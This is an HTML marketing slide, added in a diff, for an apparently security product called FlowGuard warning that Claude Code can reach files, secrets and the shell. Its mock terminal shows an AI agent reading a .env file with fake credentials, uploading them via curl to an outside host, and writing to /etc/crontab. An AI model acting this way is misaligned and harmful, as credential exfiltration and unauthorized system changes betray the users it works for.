@@ -1,0 +1,66 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html{background:#060d1a;width:1920px;height:1080px;overflow:hidden;font-family:'Segoe UI',system-ui,sans-serif;}
+body{width:1920px;height:1080px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;}
+.grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,212,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.04) 1px,transparent 1px);background-size:60px 60px;}
+.glow{position:absolute;width:1000px;height:1000px;background:radial-gradient(circle,rgba(0,212,255,0.07) 0%,transparent 65%);top:50%;left:50%;transform:translate(-50%,-50%);}
+.corner{position:absolute;width:50px;height:50px;border-color:#00d4ff;border-style:solid;opacity:0.25;}
+.corner-tl{top:32px;left:32px;border-width:2px 0 0 2px;}.corner-tr{top:32px;right:32px;border-width:2px 2px 0 0;}
+.corner-bl{bottom:32px;left:32px;border-width:0 0 2px 2px;}.corner-br{bottom:32px;right:32px;border-width:0 2px 2px 0;}
+.slide-logo{position:absolute;top:36px;left:36px;z-index:50;display:flex;align-items:center;gap:10px;}
+.sl-icon{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,#00d4ff,#0066cc);display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 4px 20px rgba(0,212,255,0.4);}
+.sl-name{font-size:17px;font-weight:800;color:#fff;}.sl-name em{color:#00d4ff;font-style:normal;}
+
+/* Layout */
+.layout{position:relative;z-index:10;display:flex;align-items:center;gap:100px;padding:0 120px;width:100%;}
+
+/* Left: headline */
+.left{flex:1;}
+.eyebrow{font-size:13px;letter-spacing:5px;color:rgba(0,212,255,0.7);text-transform:uppercase;font-weight:700;margin-bottom:20px;}
+.headline{font-size:64px;font-weight:900;color:#fff;line-height:1.1;margin-bottom:20px;text-shadow:0 0 80px rgba(0,212,255,0.2);}
+.headline em{color:#00d4ff;font-style:normal;}
+.sub{font-size:24px;color:rgba(255,255,255,0.45);line-height:1.5;}
+.divider{width:80px;height:3px;background:linear-gradient(90deg,#00d4ff,transparent);margin:32px 0;}
+.big-q{font-size:28px;font-weight:700;color:rgba(255,255,255,0.85);line-height:1.4;}
+.big-q em{color:#00d4ff;font-style:normal;}
+
+/* Right: terminal */
+.right{width:780px;flex-shrink:0;}
+.terminal{background:#0a1628;border:1px solid rgba(0,212,255,0.2);border-radius:16px;overflow:hidden;box-shadow:0 0 80px rgba(0,212,255,0.1),0 30px 80px rgba(0,0,0,0.5);}
+.t-bar{background:#111d30;padding:14px 20px;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(0,212,255,0.1);}
+.dot{width:12px;height:12px;border-radius:50%;}.dot-r{background:#ef4444;}.dot-y{background:#f59e0b;}.dot-g{background:#22c55e;}
+.t-title{flex:1;text-align:center;font-size:12px;color:rgba(255,255,255,0.3);letter-spacing:1px;}
+.t-body{padding:28px 26px;font-family:'Courier New',monospace;}
+.tl{font-size:14px;line-height:2.1;}
+.tp{color:rgba(0,212,255,0.7);}.tc{color:#e2e8f0;}.to{color:rgba(255,255,255,0.4);}.tw{color:#f59e0b;}.te{color:#ef4444;font-weight:700;}.cursor{display:inline-block;width:9px;height:15px;background:#00d4ff;vertical-align:middle;}
+</style></head><body>
+<div class="grid"></div><div class="glow"></div>
+<div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+<div class="corner corner-bl"></div><div class="corner corner-br"></div>
+<div class="slide-logo"><div class="sl-icon">🛡️</div><div class="sl-name">Flow<em>Guard</em></div></div>
+
+<div class="layout">
+  <div class="left">
+    <div class="eyebrow">Security Alert</div>
+    <div class="headline">Claude Code<br>Can Do <em>Anything</em><br>On Your Machine.</div>
+    <div class="sub">Your files. Your secrets.<br>Your API keys. Your shell.</div>
+    <div class="divider"></div>
+    <div class="big-q">But who is watching<br><em>Claude Code?</em></div>
+  </div>
+  <div class="right">
+    <div class="terminal">
+      <div class="t-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="t-title">✦ Claude Code — bash</div></div>
+      <div class="t-body">
+        <div class="tl"><span class="tp">claude ❯ </span><span class="tc">Read file: .env</span></div>
+        <div class="tl"><span class="to">&nbsp;&nbsp;→ DB_PASSWORD=prod_secret_2024</span></div>
+        <div class="tl"><span class="to">&nbsp;&nbsp;→ AWS_SECRET_KEY=AKIAIOSFODNN7...</span></div>
+        <div class="tl" style="margin-top:6px"><span class="tp">claude ❯ </span><span class="tc">Bash: curl https://ext-server.io/upload</span></div>
+        <div class="tl"><span class="tw">&nbsp;&nbsp;⚠ Uploading credentials... 847 bytes sent</span></div>
+        <div class="tl" style="margin-top:6px"><span class="tp">claude ❯ </span><span class="tc">Write: /etc/crontab</span></div>
+        <div class="tl"><span class="te">&nbsp;&nbsp;✗ CRITICAL — unauthorized system path</span></div>
+        <div class="tl" style="margin-top:6px"><span class="tp">claude ❯ </span><span class="cursor"></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+</body></html>
